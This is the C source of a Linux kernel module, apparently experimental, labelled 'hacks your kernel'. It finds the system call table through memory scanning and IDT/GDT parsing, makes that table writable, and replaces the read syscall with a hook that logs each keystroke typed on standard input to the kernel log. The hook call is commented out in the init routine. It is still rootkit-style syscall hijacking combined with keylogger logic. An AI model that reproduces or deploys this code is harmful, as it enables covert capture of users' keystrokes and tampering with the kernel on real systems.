#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <linux/syscalls.h>
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <linux/smp_lock.h>

void unhook_function(void);

// for convenience, we're using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);

fun_ssize_t_int_pvoid_size_t original_read;

// since we do not include sysmap.h, we have to construct ptr_sys_call_table "on our own"
// this is done by the function find_sys_call_table
void* ptr_sys_call_table;
void* ptr_sys_call_table2;
void* ptr_sys_call_table3;

unsigned long **find_sys_call_table(void)  {
  void** sys_call_table;
  sys_call_table = (void *)(&lock_kernel);
  while((void*)sys_call_table < (void*)(&loops_per_jiffy)) {
      if (sys_call_table[__NR_close] == sys_close){
          return (unsigned long **)sys_call_table;
      }
      sys_call_table = (void *)((char*)sys_call_table)+2;
  }
  return NULL;
}

struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none; 
    unsigned char flags;
    unsigned short off2;
} __attribute__ ((packed)) *idt;

struct dt {
    u16 limit;
    u32 base;
} __attribute__ ((__packed__));

struct idt_entry {
    u16 offset_low;
    u16 selector;
    u8 zero;
    u8 attr;
    u16 offset_high;
} __attribute__((__packed__));

struct gdt_entry {
    u16 limit_low;
    u16 base_low;
    u8 base_mid;
    u8 access;
    u8 attr;
    u8 base_high;
} __attribute__((__packed__));

int kmem;

unsigned long **find_sys_call_table_2(void){
    void *sch;
    void **sct;
    char *interestingBytes = "\xff\x14\x85";
    char *tmp;
    int i;
    asm ("sidt %0" : "=m" (idtr)); 
    printk(KERN_ALERT "idtr.limit %x; idtr.base %x\n", idtr.limit, idtr.base);
    idt = (void*)(idtr.base) + 4*0x80;
    sch = (void*) ((idt->off2 << 16) | idt->off1);
    printk(KERN_ALERT "sch at 0x%p\n", sch);
    // 0xc10030d0 is the correct address for sch (on my machine),
    // (see gdb -> print &system_call, this address should be 
    // in sch)
    // so we have to look how we can extract this beast from
    // idt somehow
    sch = (void*) 0xc10030d0;
    sct = (void**) (((unsigned int) sch) + 0x45);
    for (i=0; i<100; ++i){
        tmp = ((char*)sch) + i;
        if (tmp[0]==interestingBytes[0] &&
                tmp[1]==interestingBytes[1] &&
                tmp[2]==interestingBytes[2]){
            printk(KERN_ALERT "Byte combination found.\n");
            sct = tmp+3;
        }
    }
    printk(KERN_ALERT "Suspect syscalltable at 0x%p\n", *sct);
    return *sct;
}

unsigned long** find_sys_call_table_3(void){
    void **sys_call_table;
    struct dt gdt;
    struct dt idt;
    struct idt_entry *idt_entry;
    struct gdt_entry *gdt_entry;
    u32 syscall_offset;
    u32 syscall_base;
    u8 *system_call;
    __asm__("sgdt %0\n" : "=m"(gdt));
    __asm__("sidt %0\n" : "=m"(idt));
    idt_entry = (struct idt_entry*)(idt.base);
    idt_entry += 0x80;
    syscall_offset = (idt_entry->offset_high << 16) | idt_entry->offset_low;
    gdt_entry = (struct gdt_entry*)(gdt.base);
    gdt_entry += idt_entry->selector;
    syscall_base = (gdt_entry->base_high << 24)
        | (gdt_entry->base_mid << 16)
        | (gdt_entry->base_low);
    printk(KERN_ALERT "syscall_base is at %p\n", syscall_base);
    system_call = (u8*)(syscall_base + syscall_offset);
    //while ((*(u32*)(system_call++) & 0xffffff) != 0x8514ff);
    sys_call_table = *(void***)(system_call+2);
    return sys_call_table;
}

/* Make a certain address writeable */
void make_page_writable(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);

    pageTableEntry->pte |=  _PAGE_RW;
}

/* Make a certain address readonly */
void make_page_readonly(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
}

asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    char __user* cur_buf;
    retval = original_read(fd, buf, count);
    cur_buf = buf;
    if (retval > 0 && fd == 0){
        printk(KERN_INFO "User typed %c (%d)\n", *buf, *buf);
    }
    return retval;
}

/* Hooks the read system call. */
void hook_function(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  original_read = sys_call_table[__NR_read];

  make_page_writable((long unsigned int) ptr_sys_call_table);

  sys_call_table[__NR_read] = (void*) hooked_read;
}

/* Hooks the read system call. */
void unhook_function(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  make_page_writable((long unsigned int) ptr_sys_call_table);
  sys_call_table[__NR_read] = (void*) original_read;
  make_page_readonly((long unsigned int) ptr_sys_call_table);
}

/* Initialization routine */
static int __init _init_module(void)
{
    ptr_sys_call_table = find_sys_call_table();
    ptr_sys_call_table2 = find_sys_call_table_2();
    ptr_sys_call_table3 = find_sys_call_table_3();
    printk(KERN_ALERT "First suspicion of syscall table:   0x%p\n", ptr_sys_call_table);
    printk(KERN_ALERT "Second suspicion of syscall table:  0x%p\n", ptr_sys_call_table2);
    printk(KERN_ALERT "Third suspicion of syscall table:   0x%p\n", ptr_sys_call_table3);
    //hook_function();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    //unhook_function();
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);


/* OTHER STUFF */

/*
 * Get rid of taint message by declaring code as GPL.
 */
MODULE_LICENSE("GPL");

/*
 * Module information
 */
MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */
